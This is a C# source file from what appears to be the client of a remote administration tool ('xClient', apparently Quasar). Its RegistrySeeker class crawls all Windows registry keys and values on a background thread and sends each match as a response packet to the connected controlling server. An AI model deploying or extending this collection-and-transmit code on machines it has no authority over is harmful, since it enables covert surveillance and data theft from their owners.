/*
 * Derived and Adapted from CrackSoft's Reg Explore.
 * Reg Explore v1.1 (Release Date: June 24, 2011)
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * This is a work that is not of the original. It
 * has been modified to suit the needs of another
 * application.
 * First Modified by Justin Yanke on August 15, 2015
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Unmodified Source:
 * https://regexplore.codeplex.com/SourceControl/latest#Registry/RegSearcher.cs
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security;
using Microsoft.Win32;
using System.Threading;
using xClient.Core.Extensions;

namespace xClient.Core.Registry
{
    public class MatchFoundEventArgs : EventArgs
    {
        public RegSeekerMatch Match { get; private set; }

        public MatchFoundEventArgs(RegSeekerMatch match)
        {
            Match = match;
        }
    }

    public class SearchCompletedEventArgs : EventArgs
    {
        public List<RegSeekerMatch> Matches { get; private set; }

        public SearchCompletedEventArgs(List<RegSeekerMatch> matches)
        {
            Matches = matches;
        }
    }

    public class RegistrySeeker
    {
        #region CONSTANTS

        /// <summary>
        /// An array containing all of the root keys for the registry.
        /// </summary>
        public static readonly RegistryKey[] ROOT_KEYS = new RegistryKey[]
        {
            Microsoft.Win32.Registry.ClassesRoot,
            Microsoft.Win32.Registry.CurrentUser,
            Microsoft.Win32.Registry.LocalMachine,
            Microsoft.Win32.Registry.Users,
            Microsoft.Win32.Registry.CurrentConfig
        };

        #endregion

        #region Fields

        /// <summary>
        /// Fired when the RegistrySeeker has finished searching through the registry.
        /// </summary>
        public event EventHandler<SearchCompletedEventArgs> SearchComplete;

        /// <summary>
        /// Fired when a RegistryKey is found.
        /// </summary>
        public event EventHandler<MatchFoundEventArgs> MatchFound;

        /// <summary>
        /// The worker thread that does the searching/traversal through the registry.
        /// </summary>
        private BackgroundWorker searcher;

        /// <summary>
        /// The lock used to ensure thread safety.
        /// </summary>
        private readonly object locker = new object();

        /// <summary>
        /// The search arguments to use for customizable registry searching.
        /// </summary>
        public RegistrySeekerParams searchArgs;

        /// <summary>
        /// The list containing the matches found during the search.
        /// </summary>
        private List<RegSeekerMatch> matches;

        /// <summary>
        /// The queue of registry key paths to analyze further.
        /// </summary>
        private Queue<string> pendingKeys;

        #endregion

        public RegistrySeeker()
        {
            searcher = new BackgroundWorker() { WorkerSupportsCancellation = true, WorkerReportsProgress = true };

            searcher.DoWork += new DoWorkEventHandler(worker_DoWork);
            searcher.RunWorkerCompleted += new RunWorkerCompletedEventHandler(worker_RunWorkerCompleted);
            searcher.ProgressChanged += new ProgressChangedEventHandler(worker_ProgressChanged);
        }

        public void Start(string[] rootKeyNames)
        {
            if (rootKeyNames != null && rootKeyNames.Length > 0)
            {
                RegistryKey[] keys = new RegistryKey[rootKeyNames.Length];

                for (int i = 0; i < rootKeyNames.Length; i++)
                {
                    // ToDo: Get correct root key...
                    keys[i] = Microsoft.Win32.Registry.LocalMachine.OpenWritableSubKeySafe(rootKeyNames[i]);
                }

                Start(new RegistrySeekerParams(keys, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values | Enums.RegistrySearchAction.Data));
            }
        }

        public void Start(RegistrySeekerParams args)
        {
            searchArgs = args;

            matches = new List<RegSeekerMatch>();
            searcher.RunWorkerAsync();
        }

        void worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            MatchFound(this, new MatchFoundEventArgs((RegSeekerMatch)e.UserState));
        }

        public void Stop()
        {
            if (searcher.IsBusy)
            {
                lock (locker)
                {
                    searcher.CancelAsync();
                    // Wait until it is done... Similar to synchronous stop.
                    Monitor.Wait(locker);
                }
            }
        }

        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            SearchComplete(this, new SearchCompletedEventArgs(matches));
        }

        void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            foreach (RegistryKey key in searchArgs.RootKeys)
                Search(key);
        }

        void Search(string rootKeyName)
        {
            try
            {
                // ToDo: Use an extension method to open from the correct root key.
                using (RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenWritableSubKeySafe(rootKeyName))
                {
                    Search(key);
                }
            }
            catch
            { }
        }

        void Search(RegistryKey rootKey)
        {
            string rootKeyName = rootKey.Name.Substring(rootKey.Name.LastIndexOf('\\') + 1);
            ProcessKey(rootKey, rootKeyName);

            RegistryKey subKey = null;
            string keyName;
            string parentPath;
            int cropIndex = rootKey.Name.Length + 1;
            pendingKeys = new Queue<string>(rootKey.GetSubKeyNames());

            while (pendingKeys.Count > 0)
            {
                if (searcher.CancellationPending)
                {
                    lock (locker)
                    {
                        // Allow for a synchronous stop.
                        Monitor.Pulse(locker);
                        return;
                    }
                }

                keyName = pendingKeys.Dequeue();

                try
                {
                    subKey = rootKey.OpenSubKey(keyName);
                }
                catch (SecurityException)
                {
                    subKey = null;
                }
                finally
                {
                    if (subKey != null)
                    {
                        ProcessKey(subKey, keyName);
                        parentPath = subKey.Name.Substring(cropIndex) + '\\';
                        EnqueueSubKeys(subKey, parentPath);
                    }
                }
            }
        }

        private void EnqueueSubKeys(RegistryKey key, string parentPath)
        {
            try
            {
                foreach (string name in key.GetSubKeyNames())
                    pendingKeys.Enqueue(string.Concat(parentPath, name));
            }
            catch
            { }
        }

        private void ProcessKey(RegistryKey key, string keyName)
        {
            foreach (string valueName in key.GetValueNames())
            {
                if (searcher.CancellationPending)
                    return;

                MatchData(key, valueName);
            }
        }

        private void MatchData(RegistryKey key, string valueName)
        {
            string valueData = key.GetValueKind(valueName).RegistryTypeToString(key.GetValue(valueName, string.Empty));

            AddMatch(key.Name, valueName, valueData);
        }

        private void AddMatch(string key, string value, string data)
        {
            RegSeekerMatch match = new RegSeekerMatch(key, value, data);

            if (MatchFound != null)
                searcher.ReportProgress(0, match);

            if (SearchComplete != null)
            {
                new xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse(match).Execute(xClient.Program.ConnectClient);
            }
        }
        
        public bool IsBusy
        {
            get { return searcher.IsBusy; }
        }
    }
}